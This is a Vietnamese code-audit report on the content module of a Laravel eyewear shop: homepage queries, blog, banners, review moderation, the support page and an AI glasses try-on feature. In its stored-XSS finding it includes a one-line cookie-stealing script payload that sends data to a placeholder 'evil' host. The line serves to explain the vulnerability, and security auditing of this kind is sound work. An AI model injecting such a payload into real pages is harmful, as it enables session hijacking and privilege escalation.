# 08 — Module Nội dung & Trải nghiệm

Gồm: trang chủ, blog, banner, bố cục trang chủ, kiểm duyệt bình luận, trang hỗ trợ, và
chức năng **thử kính AI**.

---

## 8.1. `app/Http/Controllers/HomeController.php` (48 dòng)

Controller `__invoke`, cũng **không được route gọi trực tiếp** — `ClientRouteAliasController::home()`
gọi `app(HomeController::class)()` khi URL không có `?url=`.

Dữ liệu trang chủ (7 truy vấn):

| Biến | Nguồn |
|---|---|
| `banners` | `Banner::visible('HOME_SLIDER')->limit(3)` |
| `featuredCategories` | Danh mục ACTIVE có ≥1 sản phẩm ACTIVE, lấy 6 |
| `featuredProducts` | 8 sản phẩm `orderByDesc('view_count')` |
| `trendProducts` | 3 sản phẩm `orderByDesc('view_count')` |
| `newProducts` | 8 sản phẩm `latest()` |
| `posts` | `Post::published()->limit(5)` |
| `homeLayout` | `DB::table('home_layouts')->orderBy('sort_order')->keyBy('section_key')` |

> ⚠️ `featuredProducts` và `trendProducts` dùng **cùng một tiêu chí sắp xếp** (`view_count DESC`).
> `trendProducts` chính là 3 phần tử đầu của `featuredProducts` — hai khối "Nổi bật" và
> "Xu hướng" trên trang chủ hiển thị **cùng sản phẩm**, chỉ khác số lượng. Lãng phí 1 truy vấn.

> 🔴 Cả hai khối phụ thuộc `view_count`, mà `view_count` bị bơm tự do bởi bất kỳ ai (xem
> [03](03-module-san-pham.md) §3.2, mục H-05). **Trang chủ có thể bị thao túng bằng F5.**

> ⚠️ `featuredCategories` lọc trong PHP sau khi lấy toàn bộ:
> ```php
> Category::active()->withCount([...])->orderBy('id')->get()
>     ->filter(fn($c) => (int) $c->active_products_count > 0)->take(6)
> ```
> Nạp **mọi** danh mục ACTIVE rồi mới lọc — nên dùng `having('active_products_count','>',0)->limit(6)`.

---

## 8.2. `app/Http/Controllers/Admin/HomeLayoutAdminController.php` (60 dòng)

Cho phép ADMIN bật/tắt và sắp xếp 8 khối trang chủ.

| `section_key` | Ý nghĩa |
|---|---|
| `banner` | Slider/banner đầu trang |
| `categories` | Danh mục nổi bật |
| `new_products` | Sản phẩm mới |
| `best_sellers` | Sản phẩm bán chạy |
| `brands` | Khối thương hiệu |
| `news` | Bài viết nổi bật |
| `services` | Quyền lợi/dịch vụ |
| `support` | Kênh hỗ trợ & cam kết |

`update()`:
```php
validate([
    'sections' => 'required|array',
    'sections.*.section_key' => 'required|string|exists:home_layouts,section_key',   // ✅ whitelist qua DB
    'sections.*.sort_order'  => 'required|integer|min:1|max:99',
    'sections.*.status'      => 'nullable|boolean',
]);
foreach ($data['sections'] as $section) {
    DB::table('home_layouts')->where('section_key', ...)->update([...]);
}
```

✅ `exists:home_layouts,section_key` ngăn chèn key lạ.
⚠️ **Không có transaction** — lỗi giữa chừng để lại bố cục nửa vời.
⚠️ **Vòng lặp UPDATE** — 8 query cho một lần lưu. Chấp nhận được với 8 dòng.
⚠️ Bảng `home_layouts` **không có model, không có migration**. Dữ liệu khởi tạo phải nhập tay.
⚠️ `sectionMeta()` hardcode icon + mô tả cho đúng 8 key. Thêm key mới trong CSDL → không có
metadata → giao diện thiếu icon.

---

## 8.3. Blog

### `app/Http/Controllers/BlogController.php` (53 dòng) — phía khách

- `index()`: `Post::published()` (`status='PUBLISHED'` + `latest('published_at')`), lọc theo
  slug chuyên mục qua `firstOrFail()`, paginate 9.
- `show()`: `abort_unless($post->status === 'PUBLISHED', 404)` ✅

> ⚠️ `show()` nhận `{post:slug}` — nhưng `Post` **không khai báo `getRouteKeyName()`**; route
> model binding dùng cú pháp `{post:slug}` trong `web.php` nên vẫn đúng ✅.
> Tuy nhiên `slug` **không được đảm bảo unique** (`PostAdminController::validateCategory`/
> `validatePost` chỉ có `nullable|string|max:300`, **không có `unique`**). Hai bài viết cùng
> slug → `firstOrFail` luôn trả bài cũ hơn, bài mới không truy cập được.

- `index()` và `show()` mỗi cái chạy thêm 2–3 truy vấn phụ (`recentPosts`, `relatedPosts`,
  `categories` kèm `withCount`).

### 🔴 `resources/views/blog/show.blade.php:57` — Stored XSS

```blade
{!! $post->content ?: '<p>' . e($post->summary) . '</p>' !!}
```

`$post->content` được render **thô, không qua bất kỳ bộ lọc nào**. Nguồn dữ liệu là
`PostAdminController::validatePost()`:
```php
'content' => ['nullable', 'string'],     // ← không giới hạn, không sanitize
```

Bất kỳ tài khoản **`STAFF`** nào (không cần `ADMIN`) đều tạo/sửa được bài viết
(`routes/admin.php` đặt các route `posts.*` **ngoài** nhóm `admin:ADMIN`). Chèn
`<script>fetch('//evil/?c='+document.cookie)</script>` vào nội dung, đặt trạng thái
`PUBLISHED` → script chạy trên **trang công khai** với mọi khách truy cập, và chạy trong
phiên của **ADMIN** khi họ xem bài.

Đây là con đường leo thang quyền `STAFF → ADMIN`. Xem [10](10-ket-qua-audit.md) mục **C-04**.

Đối chiếu: mô tả sản phẩm **có** được lọc, nhưng ở tầng view chứ không phải tầng lưu —
`resources/views/products/show.blade.php:29–39`:
```php
$descriptionHtml = preg_replace('/<(script|style)\b[^>]*>.*?<\/\1>/is', '', $rawDescription);
$descriptionHtml = strip_tags($descriptionHtml, '<p><br><strong><b><em><i><ul><ol><li><h2><h3><h4>');
$descriptionHtml = preg_replace('/<([a-z][a-z0-9]*)\b[^>]*>/i', '<$1>', $descriptionHtml);
```
Allowlist thẻ + **xóa sạch mọi thuộc tính** (loại được `onerror=`, `href="javascript:"`) —
khá chặt ✅. Nhưng logic sanitize nằm trong Blade, lặp ở 2 chỗ trong cùng file, và **blog
không hề dùng nó**.

### Các chỗ `{!! !!}` khác (đã rà soát)

| File | Đánh giá |
|---|---|
| `products/show.blade.php:114,164` | ✅ Đã sanitize (ở trên) |
| `blog/show.blade.php:57` | 🔴 **Không sanitize** |
| `policy.blade.php:9`, `terms.blade.php:9` | ✅ Biến từ `resources/markdown`, không phải input người dùng |
| `profile/two-factor-authentication-form.blade.php:42` | ✅ SVG do Fortify sinh (view chết) |
| `components/checkbox.blade.php`, `input.blade.php` | ✅ `$attributes->merge()` của Blade |
| `admin/shared/table.blade.php:37` | ✅ `$cell->toHtml()` — chỉ khi cell là `Htmlable` |

---

## 8.4. `app/Http/Controllers/Admin/PostAdminController.php` (247 dòng)

Quản lý bài viết **và** chuyên mục bài viết trong cùng một controller (11 phương thức public).

| Nhóm | Method |
|---|---|
| Bài viết | `index`, `create`, `store`, `edit`, `update`, `hidden`, `uploadEditorImage` |
| Chuyên mục | `categories`, `createCategory`, `storeCategory`, `editCategory`, `updateCategory`, `hiddenCategory` |

### Điểm cần lưu ý

1. 🔴 **`content` không sanitize** (xem §8.3).
2. ⚠️ **`slug` không `unique`** cho cả bài viết lẫn chuyên mục.
3. ⚠️ **Slug tự sinh không ổn định:**
   ```php
   $data['slug'] = ($data['slug'] ?? '') !== '' ? $data['slug'] : Str::slug($data['title']) . '-' . ($post?->id ?? time());
   ```
   Khi **tạo mới** → hậu tố `time()`; khi **sửa** → hậu tố `$post->id`. Nghĩa là bài viết đổi
   slug ở lần chỉnh sửa đầu tiên → **URL cũ chết**, không có redirect 301. Ảnh hưởng SEO.
4. ⚠️ **`published_at` chỉ đặt một lần:**
   ```php
   if ($data['status'] === 'PUBLISHED' && ! $post?->published_at) $data['published_at'] = now();
   ```
   Bài từng đăng → ẩn → đăng lại: giữ `published_at` cũ. Đúng chủ ý ✅.
   Nhưng: khi **tạo mới** với `status = 'PUBLISHED'`, `$post` là `null` → `! null?->published_at`
   là `true` → set `now()` ✅.
5. ⚠️ **Thứ tự route quan trọng:** `/bai-viet/chuyen-muc` được đăng ký **trước** `/bai-viet/{post}/sua`
   trong `routes/admin.php` (dòng 63–72). Đúng thứ tự ✅, nhưng mong manh — đảo dòng là vỡ.
6. ⚠️ `postFields()` gọi `PostCategory::orderBy('name')->pluck(...)` **mỗi lần render form**.
7. `uploadEditorImage()` cho CKEditor: validate `image|mimes:...|max:4096`, lưu vào
   `public/upload/BaiViet/{uuid}.{ext}`, trả JSON `{url}`. Có `throttle:uploads` (20/phút) ✅.
   Nhưng **không giới hạn dung lượng tổng**, không dọn ảnh mồ côi.

---

## 8.5. Banner — `app/Http/Controllers/Admin/BannerAdminController.php` (159 dòng)

Chỉ `ADMIN`. CRUD banner với 5 vị trí và 3 nền tảng.

| Vị trí (`position`) | Dùng ở |
|---|---|
| `HOME_SLIDER` | `HomeController` — slider trang chủ, limit 3 |
| `HOME_BANNER_1`, `HOME_BANNER_2` | **Không có code nào đọc** |
| `CATEGORY_BANNER` | **Không có code nào đọc** |
| `PRODUCT_BANNER` | `ProductController::index()` — banner trang danh sách SP |

> ⚠️ 3/5 vị trí banner **chưa được hiển thị ở đâu cả**. Admin tạo banner `CATEGORY_BANNER`
> xong sẽ không thấy nó xuất hiện.

`platform` (`DESKTOP`/`MOBILE`/`BOTH`) được lưu và lọc trong admin, nhưng scope
`Banner::visible()` **không hề dùng `platform`** — banner MOBILE vẫn hiện trên desktop.

### `Banner::scopeVisible()` (model, dòng 26–34)

```php
->where('status', 'ACTIVE')
->when($position, fn($q) => $q->where('position', $position))
->where('start_at', '<=', now())
->where(fn($q) => $q->whereNull('end_at')->orWhere('end_at', '>=', now()))
->orderBy('priority')
```
Logic lịch chiếu đúng và đầy đủ ✅ (`end_at` null = vô thời hạn).

### 🔴 Ba chiến lược lưu ảnh mâu thuẫn

Đây là điểm rối nhất của toàn dự án:

| Controller | Cách lưu | Đường dẫn thực tế |
|---|---|---|
| `BannerAdminController::storeUpload` | `Storage::disk('public')->putFileAs('upload/banner', ...)` | `storage/app/public/upload/banner/` → truy cập qua symlink `public/storage/upload/banner/` |
| `ProductAdminController::storeUpload` | `$file->move(public_path('upload/anh_san_pham'))` | `public/upload/anh_san_pham/` |
| `PostAdminController::storeUpload` | `$file->move(public_path('upload/BaiViet'))` | `public/upload/BaiViet/` |
| `AccountController` (avatar) | `$file->move(public_path('upload'))` | `public/upload/` |

Hậu quả trực tiếp là accessor `Banner::getImageSrcAttribute()` (74 dòng model, **50 dòng chỉ
để đoán đường dẫn ảnh**):

```php
'' → asset('img/banner/banner-main-1.jpg')
http(s):// → giữ nguyên
'storage/...' → asset($image)
'upload/...' → file_exists(public_path($image)) ? asset($image) : asset('storage/' . $image)
'banner/...' → thử public/upload/banner/... rồi fallback storage/upload/banner/...
còn lại → thử public/upload/banner/{tên} rồi fallback storage/upload/banner/{tên}
```

**Mỗi lần render một banner là 1–2 lời gọi `file_exists()` trên đĩa.** Trang chủ 3 banner =
tối đa 6 stat syscall. Đây là "sửa lỗi bằng cách đoán" thay vì chuẩn hóa một chiến lược lưu trữ.
Ba commit gần nhất (`15c9df0`, `41e0c9a`, `7967a7b`) đều xoay quanh việc vá đường dẫn ảnh —
triệu chứng của vấn đề gốc này.

Xem [10](10-ket-qua-audit.md) mục **H-03** (mất file khi deploy) và **M-22**.

### Các vấn đề khác của `BannerAdminController`

- `prepareData()` nhận tham số `?Banner $banner` nhưng **không dùng đến** — code thừa.
- `hidden()` chỉ đặt `INACTIVE`, không có xóa. Ảnh cũ tồn tại mãi.
- Cập nhật banner **không xóa ảnh cũ** khi thay ảnh mới.

---

## 8.6. `app/Http/Controllers/Admin/ReviewAdminController.php` (71 dòng)

Kiểm duyệt bình luận. Lọc theo `status`, `rating` (1–5), `keyword` (nội dung / tên+email
người dùng / tên+mã sản phẩm).

```php
if ($status === 'VISIBLE')      $q->whereIn('status', ['VISIBLE','PENDING']);
elseif ($status === 'HIDDEN')   $q->where('status', $status);
```

> ⚠️ **Gộp `PENDING` vào `VISIBLE`** — nhất quán với `Product::visibleReviews()`. Nhưng nghĩa
> là **không có hàng đợi kiểm duyệt thật**: đánh giá `PENDING` đã hiển thị công khai rồi. Trạng
> thái `PENDING` không có ý nghĩa thực tế. Kết hợp với việc `ProductController::storeReview()`
> luôn tạo với `status = 'VISIBLE'`, **không đánh giá nào từng ở trạng thái `PENDING`**.
> Toàn bộ workflow kiểm duyệt là hậu kiểm (ẩn sau khi đã hiện).

`update()` chỉ đổi `status`. Không có trả lời bình luận, không thông báo cho người viết.

---

## 8.7. `app/Http/Controllers/PageController.php` (99 dòng)

Hai trang tĩnh: `/lien-he` (chỉ render view) và `/ho-tro` (có tìm kiếm).

### `support()` — tìm kiếm trong 6 mục hardcode

`normalizeSearchText()` là phần hay:
```php
Str::of($text)->ascii()->lower()
    ->replaceMatches('/[^a-z0-9\s]+/', ' ')
    ->replaceMatches('/\s+/', ' ')->trim()
```
Bỏ dấu tiếng Việt trước khi so khớp → gõ "giao hang" tìm được "giao hàng" ✅. Xử lý tiếng Việt
đúng cách.

> ⚠️ `supportItems()` gọi `route('account.orders.index')`, `route('checkout.index')`,
> `route('returns.index')` — đều là route **yêu cầu đăng nhập**. Khách chưa đăng nhập bấm vào
> kết quả tìm kiếm sẽ bị đá về trang login.

> ⚠️ Tìm kiếm chỉ dùng `str_contains` trên toàn chuỗi ghép — gõ 2 từ khóa cách nhau
> ("đơn hàng giao") không ra kết quả vì phải khớp liền mạch.

> ⚠️ `/lien-he` **không có form gửi liên hệ hoạt động** — chỉ là trang tĩnh. Không có bảng
> `contacts`, không có controller nhận POST.

---

## 8.8. Thử kính AI

### Kiến trúc

```
GET /thu-kinh  →  ProductController::tryOn()
                     ↓
              view('tryon-ai')  (104 dòng Blade)
                     ↓
      <script id="tryonProductData" type="application/json"> {payload} </script>
                     ↓
              public/js/tryon-ai.js  (815 dòng)
                     ↓
      public/vendor/jeelizGlassesVTOWidget/dist/JeelizVTOWidget.js
                     ↓
              JEELIZVTOWIDGET.load(product.sku)
```

Thư viện Jeeliz Glasses VTO Widget được **commit vào repo** (`public/vendor/jeelizGlassesVTOWidget/`),
không qua npm. Gồm `dist/`, `css/`, `images/` (LUT, mask nhận diện).

`tryon-ai.js` xử lý: nạp thư viện động (có retry qua query string `?retry=timestamp`), bật/tắt
camera, tải ảnh lên thay cho webcam, chọn sản phẩm, thêm vào giỏ, chế độ toàn màn hình và chế
độ modal. Có thông báo lỗi tiếng Việt khi không nạp được thư viện.

`Permissions-Policy: camera=(self)` trong `SecurityHeaders` cho phép webcam ✅.

### 🟠 Vấn đề: `hasModel` vẫn luôn `true` — hạ tầng kiểm tra đã có nhưng chưa nối

```php
// ProductController::tryOnPayload() — KHÔNG ĐỔI
'sku'      => trim((string) $product->product_code),
'hasModel' => trim((string) $product->product_code) !== '',
```

`product_code` được sinh tự động cho **mọi** sản phẩm (`'SP'.YmdHis`), nên `hasModel` **luôn
đúng**. Trong khi `JEELIZVTOWIDGET.load(product.sku)` nạp mô hình 3D **theo SKU từ dịch vụ
Jeeliz** — một mã kiểu `SP20260715103042` gần như chắc chắn không tồn tại ở đó.

**Đợt cập nhật đã xây phần còn thiếu** — endpoint kiểm tra SKU có model thật hay không:

```php
// ProductController::tryOnModelCheck()  — GET /thu-kinh/model-check?sku=...
$response = Http::withoutVerifying()->timeout(5)->withUserAgent('Mozilla/5.0')->acceptJson()
    ->get('https://glassesdbcached.jeeliz.com/sku/' . rawurlencode($sku));

$data = $response->json();
$isSupported = $response->ok() && is_array($data) && isset($data['intrinsic']) && empty($data['error']);

return response()->json(['supported' => $isSupported]);
```

Có `throttle:web-read`, timeout 5 giây, `try/catch` trả `false` khi lỗi ✅. View cũng đã truyền
URL sang JS: `data-jeeliz-model-check-url="{{ route('tryon.model-check') }}"`.

> 🔴 **Nhưng `public/js/tryon-ai.js` không hề đọc thuộc tính đó.** Tìm `modelCheck` trong toàn bộ
> `public/js/` — không có kết quả. JS vẫn gating theo `product.hasModel` từ PHP (luôn `true`).
>
> Vậy hạ tầng đã có, **phần tiêu thụ chưa nối**. Hành vi thực tế của người dùng **không đổi**:
> giao diện vẫn hứa mọi sản phẩm thử được, camera vẫn bật, gọng kính vẫn không hiện với sản phẩm
> thật. Xem [10](10-ket-qua-audit.md) mục **N-07**.

> ⚠️ **`Http::withoutVerifying()` tắt xác minh chứng chỉ TLS.** Với API công khai chỉ trả
> true/false thì tác động thấp, nhưng đây là thói quen nguy hiểm — nên bỏ và xử lý đúng vấn đề
> CA gốc nếu gặp lỗi SSL.

> Lưu ý thêm: `tryOnPayload` gửi cả `cartImage` = `$product->thumbnail_url` **thô** (chưa qua
> accessor `image_url`) — đường dẫn tương đối chưa giải, JS phải tự ghép.

### Lưu kết quả thử kính (MỚI)

`POST /thu-kinh/luu-ket-qua` → `ProductController::storeTryOnSnapshot()` (yêu cầu đăng nhập,
`throttle:user-actions`). JS chụp canvas → data-URI → gửi lên → lưu file + bản ghi `TryOnSnapshot`.

**Validate rất chặt** (`storeTryOnImage()`):
```php
preg_match('/^data:image\/(png|jpe?g);base64,/', $imageData)   // chỉ PNG/JPEG
base64_decode($base64, true)                                   // strict mode
strlen($binary) < 1000   → từ chối (ảnh rác)
strlen($binary) > 5MB    → từ chối
```
Kèm kiểm tra nghiệp vụ: `model_sku` gửi lên **phải khớp** `product_code` thật của sản phẩm;
`variant_id` **phải thuộc** đúng sản phẩm đang thử ✅.

Bảng `try_on_snapshots` (migration `2026_08_04_120000`) lưu snapshot cả `user_name`,
`user_email`, `product_name`, `price` — để admin xem lại được kể cả khi sản phẩm/tài khoản đổi.
Màn hình quản trị: `TryOnSnapshotAdminController` + `admin/try-on-snapshots/index.blade.php`.

> ⚠️ Ảnh lưu vào `public/upload/tryons/Y/m/{uuid}.{ext}` bằng `File::put(public_path(...))` —
> **nguồn ghi thứ tư** vào `public/`, tiếp tục làm nặng thêm **H-03** (mất file khi deploy Railway).
> Repo đã có 9 ảnh try-on **commit thẳng vào Git**, cho thấy đang phải chữa cháy bằng cách này.
>
> ⚠️ Không có giới hạn số snapshot mỗi người. Với ảnh 5 MB và `throttle:user-actions` 12/phút,
> một tài khoản có thể ghi **60 MB/phút** vào đĩa. Không có cơ chế dọn dẹp.

---

## 8.9. Tổng kết module

| Mã | Mức | Trạng thái | Vấn đề |
|---|---|---|---|
| **C-04** | **Nghiêm trọng** | ⚠️ **chưa sửa** | Stored XSS ở `blog/show.blade.php:57` — `STAFF` chèn JS chạy trên trang công khai và trong phiên `ADMIN` |
| H-03 | Cao | ⚠️ **nặng thêm** | Ảnh upload ghi vào `public/`; nay thêm nguồn thứ tư (ảnh thử kính, 5 MB/ảnh) |
| M-22 | TB | ⚠️ nặng thêm | Nay có **4** chiến lược lưu ảnh; `Banner::getImageSrcAttribute` vẫn `file_exists()` để đoán |
| M-23 | TB | 🟠 **một phần** | Endpoint `tryOnModelCheck` đã có ✅ nhưng **JS chưa gọi** → hành vi người dùng không đổi (N-07) |
| M-24 | TB | ⚠️ chưa sửa | Slug bài viết không `unique` và **đổi sau lần sửa đầu tiên** → hỏng URL/SEO |
| — | — | ✅ mới | Lưu & quản lý kết quả thử kính (`TryOnSnapshot`), validate ảnh base64 rất chặt |
| — | — | 🆕 mới | `Http::withoutVerifying()` tắt kiểm tra TLS; snapshot không giới hạn số lượng, không dọn dẹp |
| L-14 | Thấp | ⚠️ chưa sửa | 3/5 vị trí banner không được hiển thị ở đâu; `platform` không có tác dụng |
| L-15 | Thấp | ⚠️ chưa sửa | Trạng thái `PENDING` của đánh giá vô nghĩa |
| L-16 | Thấp | ⚠️ chưa sửa | `featuredProducts` và `trendProducts` trùng dữ liệu; `/lien-he` không có form hoạt động |
| L-17 | Thấp | ⚠️ chưa sửa | Kết quả tìm kiếm hỗ trợ trỏ tới route cần đăng nhập; `home_layouts` không có model/migration |
